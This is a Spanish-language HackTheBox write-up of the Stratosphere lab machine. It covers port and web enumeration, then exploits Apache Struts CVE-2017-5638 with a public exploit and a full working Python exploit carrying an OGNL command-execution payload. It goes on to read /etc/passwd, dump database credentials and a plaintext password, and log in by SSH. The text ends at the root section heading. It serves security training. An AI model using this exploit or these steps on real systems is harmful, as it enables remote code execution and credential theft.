---
date: 2023-05-11 12:00:00
layout: post
title: Stratosphere Writeup
subtitle: Writeup de la máquina Stratosphere de la plataforma HackTheBox
description: Realizaré la máquina Stratosphere explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Media.
image: https://www.tagnull.de/post/stratosphere/stratosphere.png
optimized_image: https://www.tagnull.de/post/stratosphere/stratosphere.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Medium
author: FredBrave
---
# Enumeración
Empezamos con un escaneo con nmap a la maquina. Este sera rapido solo para descubrir los puertos abiertos. Ya con los puertos abiertos haremos un escaneo mas exhaustivo hacia estos para identificar versiones y verificar los servicios corriendo en dichos puertos.
```bash
$ sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.188.28 -oG Targeted 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 10:53 EDT
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.129.188.28, 16) => Operation not permitted
Offending packet: TCP 10.10.16.42:56060 > 10.129.188.28:6363 S ttl=56 id=12682 iplen=44  seq=1075462083 win=1024 <mss 1460>
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.129.188.28, 16) => Operation not permitted
Offending packet: TCP 10.10.16.42:56060 > 10.129.188.28:21928 S ttl=48 id=38853 iplen=44  seq=1075462083 win=1024 <mss 1460>
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.129.188.28, 16) => Operation not permitted
Offending packet: TCP 10.10.16.42:56060 > 10.129.188.28:11303 S ttl=42 id=28984 iplen=44  seq=1075462083 win=1024 <mss 1460>
Nmap scan report for 10.129.188.28
Host is up (0.17s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 98.88 seconds

$ sudo nmap -p22,80,8080 -sCV 10.129.188.28 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 10:56 EDT
Nmap scan report for 10.129.188.28
Host is up (0.19s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b1637d43c180415c402010ddb07ac2d (RSA)
|   256 e3777b2c23b08ddf38356c40abf68150 (ECDSA)
|_  256 d76b669c19fcaa666c187accb5870e40 (ED25519)
80/tcp   open  http
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Stratosphere
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Thu, 11 May 2023 14:57:08 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495000"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Thu, 11 May 2023 14:57:05 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Thu, 11 May 2023 14:57:06 GMT
|     Connection: close
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 
|     Date: Thu, 11 May 2023 14:57:07 GMT
|_    Connection: close
8080/tcp open  http-proxy
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Stratosphere
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Thu, 11 May 2023 14:57:07 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495000"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Thu, 11 May 2023 14:57:05 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Thu, 11 May 2023 14:57:05 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Date: Thu, 11 May 2023 14:57:06 GMT
|_    Connection: close
|_http-open-proxy: Proxy might be redirecting requests
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.93%I=7%D=5/11%Time=645D0241%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,786,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:\x2
SF:0W/\"1708-1519762495000\"\r\nLast-Modified:\x20Tue,\x2027\x20Feb\x20201
SF:8\x2020:14:55\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\x
SF:201708\r\nDate:\x20Thu,\x2011\x20May\x202023\x2014:57:05\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x2
SF:0\x20<meta\x20charset=\"utf-8\"/>\n\x20\x20\x20\x20<title>Stratosphere<
SF:/title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css
SF:\"\x20href=\"main\.css\">\n</head>\n\n<body>\n<div\x20id=\"background\"
SF:></div>\n<header\x20id=\"main-header\"\x20class=\"hidden\">\n\x20\x20<d
SF:iv\x20class=\"container\">\n\x20\x20\x20\x20<div\x20class=\"content-wra
SF:p\">\n\x20\x20\x20\x20\x20\x20<p><i\x20class=\"fa\x20fa-diamond\"></i><
SF:/p>\n\x20\x20\x20\x20\x20\x20<nav>\n\x20\x20\x20\x20\x20\x20\x20\x20<a\
SF:x20class=\"btn\"\x20href=\"GettingStarted\.html\">Get\x20started</a>\n\
SF:x20\x20\x20\x20\x20\x20</nav>\n\x20\x20\x20\x20</div>\n\x20\x20</div>\n
SF:</header>\n\n<section\x20id=\"greeting\">\n\x20\x20<div\x20class=\"cont
SF:ainer\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap\">\n\x20\x20\x20
SF:\x20\x20\x20<h1>Stratosphere<br>We\x20protect\x20your\x20credit\.</h1>\
SF:n\x20\x20\x20\x20\x20\x20<a\x20class=\"btn\"\x20href=\"GettingStarted\.
SF:html\">Get\x20started\x20now</a>\n\x20\x20\x20\x20\x20\x20<p><i\x20clas
SF:s=\"ar")%r(HTTPOptions,8A,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,\x20HE
SF:AD,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS\r\nContent-Length:\x200\r\nD
SF:ate:\x20Thu,\x2011\x20May\x202023\x2014:57:06\x20GMT\r\nConnection:\x20
SF:close\r\n\r\n")%r(RTSPRequest,49,"HTTP/1\.1\x20400\x20\r\nDate:\x20Thu,
SF:\x2011\x20May\x202023\x2014:57:07\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(X11Probe,49,"HTTP/1\.1\x20400\x20\r\nDate:\x20Thu,\x2011\x20May\x
SF:202023\x2014:57:07\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(FourOhFou
SF:rRequest,4F6,"HTTP/1\.1\x20404\x20\r\nContent-Type:\x20text/html;charse
SF:t=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x201114\r\nDate:\
SF:x20Thu,\x2011\x20May\x202023\x2014:57:08\x20GMT\r\nConnection:\x20close
SF:\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Sta
SF:tus\x20404\x20\xe2\x80\x93\x20Not\x20Found</title><style\x20type=\"text
SF:/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;backgroun
SF:d-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,san
SF:s-serif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20
SF:{font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D
SF:76;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;col
SF:or:black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,san
SF:s-serif;color:white;background-color:#525D76;}\x20p\x20{font-family:Tah
SF:oma,Arial,sans-serif;background:white;color:black;font-size:12px;}\x20a
SF:\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1p
SF:x;background-color:#525D76;border:none;}</style></head><body>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.93%I=7%D=5/11%Time=645D0241%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,786,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:\
SF:x20W/\"1708-1519762495000\"\r\nLast-Modified:\x20Tue,\x2027\x20Feb\x202
SF:018\x2020:14:55\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:
SF:\x201708\r\nDate:\x20Thu,\x2011\x20May\x202023\x2014:57:05\x20GMT\r\nCo
SF:nnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\
SF:x20\x20<meta\x20charset=\"utf-8\"/>\n\x20\x20\x20\x20<title>Stratospher
SF:e</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20href=\"main\.css\">\n</head>\n\n<body>\n<div\x20id=\"background
SF:\"></div>\n<header\x20id=\"main-header\"\x20class=\"hidden\">\n\x20\x20
SF:<div\x20class=\"container\">\n\x20\x20\x20\x20<div\x20class=\"content-w
SF:rap\">\n\x20\x20\x20\x20\x20\x20<p><i\x20class=\"fa\x20fa-diamond\"></i
SF:></p>\n\x20\x20\x20\x20\x20\x20<nav>\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:a\x20class=\"btn\"\x20href=\"GettingStarted\.html\">Get\x20started</a>\
SF:n\x20\x20\x20\x20\x20\x20</nav>\n\x20\x20\x20\x20</div>\n\x20\x20</div>
SF:\n</header>\n\n<section\x20id=\"greeting\">\n\x20\x20<div\x20class=\"co
SF:ntainer\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap\">\n\x20\x20\x
SF:20\x20\x20\x20<h1>Stratosphere<br>We\x20protect\x20your\x20credit\.</h1
SF:>\n\x20\x20\x20\x20\x20\x20<a\x20class=\"btn\"\x20href=\"GettingStarted
SF:\.html\">Get\x20started\x20now</a>\n\x20\x20\x20\x20\x20\x20<p><i\x20cl
SF:ass=\"ar")%r(HTTPOptions,8A,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,\x20
SF:HEAD,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS\r\nContent-Length:\x200\r\
SF:nDate:\x20Thu,\x2011\x20May\x202023\x2014:57:05\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n")%r(RTSPRequest,49,"HTTP/1\.1\x20400\x20\r\nDate:\x20Th
SF:u,\x2011\x20May\x202023\x2014:57:06\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,4F6,"HTTP/1\.1\x20404\x20\r\nContent-Type:\x2
SF:0text/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\
SF:x201114\r\nDate:\x20Thu,\x2011\x20May\x202023\x2014:57:07\x20GMT\r\nCon
SF:nection:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><
SF:title>HTTP\x20Status\x20404\x20\xe2\x80\x93\x20Not\x20Found</title><sty
SF:le\x20type=\"text/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;colo
SF:r:white;background-color:#525D76;font-size:22px;}\x20h2\x20{font-family
SF::Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size
SF::16px;}\x20h3\x20{font-family:Tahoma,Arial,sans-serif;color:white;backg
SF:round-color:#525D76;font-size:14px;}\x20body\x20{font-family:Tahoma,Ari
SF:al,sans-serif;color:black;background-color:white;}\x20b\x20{font-family
SF::Tahoma,Arial,sans-serif;color:white;background-color:#525D76;}\x20p\x2
SF:0{font-family:Tahoma,Arial,sans-serif;background:white;color:black;font
SF:-size:12px;}\x20a\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.l
SF:ine\x20{height:1px;background-color:#525D76;border:none;}</style></head
SF:><body>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.45 seconds
```
Tenemos los puertos 22,80 y 8080 abiertos. De entre estos enumerare primero el 80.
<img class="img" src="/assets/img/machines/Stratosphere/1.png" width="1200">
Al no encontrar nada interesante decido ir al 8080, pero parece tener el mismo contenido que el 80.
<img class="img" src="/assets/img/machines/Stratosphere/2.png" width="1200">
Sin mucho mas que encontrar decido intentar fuzzear la web.
```bash
ffuf -u http://10.129.188.28/FUZZ -w /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.188.28/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 167ms]
    * FUZZ: manager

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 172ms]
    * FUZZ: Monitoring

[Status: 200, Size: 1708, Words: 297, Lines: 64, Duration: 177ms]
    * FUZZ: 

:: Progress: [220546/220546] :: Job [1/1] :: 525 req/sec :: Duration: [0:06:24] :: Errors: 0 ::
```
Encuentro rutas interesantes, entre estos el manager necesita de credenciales las cuales no dispongo.
Por lo tanto me movi a la siguiente ruta Monitoring la cual me llevo a un redirect a la ruta http://10.129.188.28/Monitoring/example/Welcome.action
<img class="img" src="/assets/img/machines/Stratosphere/3.png" width="1200">
En esta habia dos botones los cuales me hacian un redirect a otras rutas como Login\_input.action y Register.action, pero de estas solo el login funcionaba el register estaba bajo construccion aun al parecer.
<img class="img" src="/assets/img/machines/Stratosphere/4.png" width="1200">
Intente algunas cosas con el login que al final no funcionaron. Por lo que decidi buscar otra forma de lograr avanzar.
Al buscar encontre que las extensiones .action son posiblemente manejadas por el framework Apache Struts.
Y al tratra de encontrar vulnerabilidades para este encontre algunas con RCE.
```bash
searchsploit Apache Struts
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache Struts - 'ParametersInterceptor' Remote Code Execution (Metasploit)                                                                                                                                  | multiple/remote/24874.rb
Apache Struts - ClassLoader Manipulation Remote Code Execution (Metasploit)                                                                                                                                 | multiple/remote/33142.rb
Apache Struts - Developer Mode OGNL Execution (Metasploit)                                                                                                                                                  | java/remote/31434.rb
Apache Struts - Dynamic Method Invocation Remote Code Execution (Metasploit)                                                                                                                                | linux/remote/39756.rb
Apache Struts - includeParams Remote Code Execution (Metasploit)                                                                                                                                            | multiple/remote/25980.rb
Apache Struts - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                                                                    | multiple/webapps/18452.txt
Apache Struts - OGNL Expression Injection                                                                                                                                                                   | multiple/remote/38549.txt
Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution                                                                                                                            | multiple/remote/43382.py
Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution (Metasploit)                                                                                                               | multiple/remote/39919.rb
Apache Struts 1.2.7 - Error Response Cross-Site Scripting                                                                                                                                                   | multiple/remote/26542.txt
Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution                                                                                                                                          | java/webapps/48917.py
Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Metasploit)                                                                                                                             | multiple/remote/27135.rb
Apache Struts 2 - Namespace Redirect OGNL Injection (Metasploit)                                                                                                                                            | multiple/remote/45367.rb
Apache Struts 2 - Namespace Redirect OGNL Injection (Metasploit)                                                                                                                                            | multiple/remote/45367.rb
Apache Struts 2 - Skill Name Remote Code Execution                                                                                                                                                          | multiple/remote/37647.txt
Apache Struts 2 - Struts 1 Plugin Showcase OGNL Code Execution (Metasploit)                                                                                                                                 | multiple/remote/44643.rb
Apache Struts 2 - Struts 1 Plugin Showcase OGNL Code Execution (Metasploit)                                                                                                                                 | multiple/remote/44643.rb
Apache Struts 2 < 2.3.1 - Multiple Vulnerabilities                                                                                                                                                          | multiple/webapps/18329.txt
Apache Struts 2.0 - 'XSLTResult.java' Arbitrary File Upload                                                                                                                                                 | java/webapps/37009.xml
Apache Struts 2.0.0 < 2.2.1.1 - XWork 's:submit' HTML Tag Cross-Site Scripting                                                                                                                              | multiple/remote/35735.txt
Apache Struts 2.0.1 < 2.3.33 / 2.5 < 2.5.10 - Arbitrary Code Execution                                                                                                                                      | multiple/remote/44556.py
Apache Struts 2.0.9/2.1.8 - Session Tampering Security Bypass                                                                                                                                               | multiple/remote/36426.txt
Apache Struts 2.2.1.1 - Remote Command Execution (Metasploit)                                                                                                                                               | multiple/remote/18984.rb
Apache Struts 2.2.3 - Multiple Open Redirections                                                                                                                                                            | multiple/remote/38666.txt
Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (1)                                                                                                                                       | linux/remote/45260.py
Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (2)                                                                                                                                       | multiple/remote/45262.py
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - 'Jakarta' Multipart Parser OGNL Injection (Metasploit)                                                                                                        | multiple/remote/41614.rb
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution                                                                                                                                         | linux/webapps/41570.py
Apache Struts 2.3.x Showcase - Remote Code Execution                                                                                                                                                        | multiple/webapps/42324.py
Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution                                                                                                                                      | linux/remote/42627.py
Apache Struts 2.5.20 - Double OGNL evaluation                                                                                                                                                               | multiple/remote/49068.py
Apache Struts < 1.3.10 / < 2.3.16.2 - ClassLoader Manipulation Remote Code Execution (Metasploit)                                                                                                           | multiple/remote/41690.rb
Apache Struts < 2.2.0 - Remote Command Execution (Metasploit)                                                                                                                                               | multiple/remote/17691.rb
Apache Struts2 2.0.0 < 2.3.15 - Prefixed Parameters OGNL Injection                                                                                                                                          | multiple/webapps/44583.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
No sabia si alguno fucnionara, pero intente los RCE de python y de entre esos el siguiente me funciono.
```bash
$ searchsploit -m linux/webapps/41570.py
  Exploit: Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/41570
     Path: /usr/share/exploitdb/exploits/linux/webapps/41570.py
    Codes: CVE-2017-5638
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/Maquinas/Machinesnormal/Stratosphere/Scripts/41570.py

$ python2 41570.py http://10.129.188.28/Monitoring/example/Welcome.action id
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: id

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
```
# Shell como richard
Al investigar el cve CVE-2017-5638 entendi la esencia de la explotacion de este, para mejorar hay que intentar asi que intente realizar un exploit del cve con python, el cual me funciono.
```bash
python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c id
uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
Error al realizar la solicitud: ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
```
Me salia un error, pero al final consegui el RCE. El codigo del exploit es el siguiente.
```python3
#!/usr/bin/bash
# CVE:  CVE-2017-5638 | Apache Struts 2.3.5 < 2.3.31 RCE
# Author: FredBrave

import optparse, requests
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url_address', help='url of target with path to .action file, for more -help')
    parser.add_option('-c', '--cmd', dest='cmd', help='Command to execute')
    (options, arguments) = parser.parse_args()
    if not options.url_address:
        parser.error('[-]Pls indicate url, Example: -u http://10.10.10.10:8080/example/example.action')
    if not options.cmd:
        parser.error('[-]Pls indicate the command to execute: -c "whoami"')
    return options

def creating_payload(cmd):
    payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
    payload += ".(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))"
    payload += ".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
    payload += ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    return payload

def execute(url, payload):
    headers = {
        'Content-Type': payload
    }
    try:
        r = requests.get(url=url, headers=headers, verify=False, stream=True)
        for chunk in r.iter_content(chunk_size=4096):
            try:
                line = chunk.decode('utf-8').strip()
                print(line)
            except (ValueError, UnicodeDecodeError) as e:
                print(f"Error al procesar chunk: {str(e)}")

    except requests.exceptions.RequestException as e:
        print(f"Error al realizar la solicitud: {str(e)}")

if __name__ == '__main__':
    options = get_arguments()
    payload = creating_payload(options.cmd)
    execute(options.url_address, payload)
```
El exploit va a estar subido en mi github por si alguien quiere gusta verlo mejor.
https://github.com/FredBrave/CVE-2017-5638-ApacheStruts2.3.5
Siguiendo con el writeup lo siguiente que hice es enumerar los usuarios con cat en el /etc/passwd
```bash
python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'cat /etc/passwd | grep "sh$"'
root:x:0:0:root:/root:/bin/bash
richard:x:1000:1000:Richard F Smith,,,:/home/richard:/bin/bash
tomcat8:x:115:119::/var/lib/tomcat8:/bin/bash
```
Ademas de tomcat8 habia un usuario richard. Trate de enumerar la id\_rsa de richard, pero no tenia permisos. Por lo que segui enumerando archivos y al enumerar los archivos en el directorio actual me encontre con los siguientes.
```bash
python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'ls -la'                      
total 24
drwxr-xr-x  5 root    root    4096 May 11 10:50 .
drwxr-xr-x 42 root    root    4096 Oct  3  2017 ..
lrwxrwxrwx  1 root    root      12 Sep  3  2017 conf -> /etc/tomcat8
-rw-r--r--  1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x  2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx  1 root    root      17 Sep  3  2017 logs -> ../../log/tomcat8
drwxr-xr-x  2 root    root    4096 May 11 10:50 policy
drwxrwxr-x  4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
lrwxrwxrwx  1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8
```
De entre estos el mas interesante era db\_connect, al hacerle un cat encontre claves.
```bash
python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'cat db_connect'
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin
```
Intente entrar en el manager y el login, pero no me funcionaron, al no tener muchas mas rutas intente enumerar la base de datos, la maquina tenia mysqlshow por lo que la enumere con esta.
```bash
$ python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin'
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| users              |
+--------------------+

$ python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin users'
Database: users
+----------+
|  Tables  |
+----------+
| accounts |
+----------+
$ python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin users accounts'
Database: users  Table: accounts
+----------+-------------+--------------------+------+-----+---------+-------+---------------------------------+---------+
| Field    | Type        | Collation          | Null | Key | Default | Extra | Privileges                      | Comment |
+----------+-------------+--------------------+------+-----+---------+-------+---------------------------------+---------+
| fullName | varchar(45) | utf8mb4_general_ci | YES  |     |         |       | select,insert,update,references |         |
| password | varchar(30) | utf8mb4_general_ci | YES  |     |         |       | select,insert,update,references |         |
| username | varchar(20) | utf8mb4_general_ci | YES  |     |         |       | select,insert,update,references |         |
+----------+-------------+--------------------+------+-----+---------+-------+---------------------------------+---------+
$ python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'mysql -uadmin -padmin -e "select username,password from accounts" users'
username	password
richard	9tc*rhKuG5TyXvUJOrE^5CK7k
```
Y al enumerar y sacar informacion de toda la base de datos users me encontre con una password del usuario richar, esta en texto claro lo cual significa que puedo usarla sin ninguna necesidad de crackear un hash o algo asi.
Al intentar ingresar al ssh de la maquina con dicha clave funciona.
```bash
ssh richard@10.129.188.28
The authenticity of host '10.129.188.28 (10.129.188.28)' can't be established.
ED25519 key fingerprint is SHA256:M0iueOref5GIXJLH7IEi0XWv+HJ/bQJRx63Plk2hlHE.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:221: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.188.28' (ED25519) to the list of known hosts.
richard@10.129.188.28's password: 
Linux stratosphere 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u2 (2018-02-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 27 16:26:33 2018 from 10.10.14.2
richard@stratosphere:~$ whoami
richard
```
# Shell como root
Enumerando encontre que puedo ejecutar como root lo siguiente.
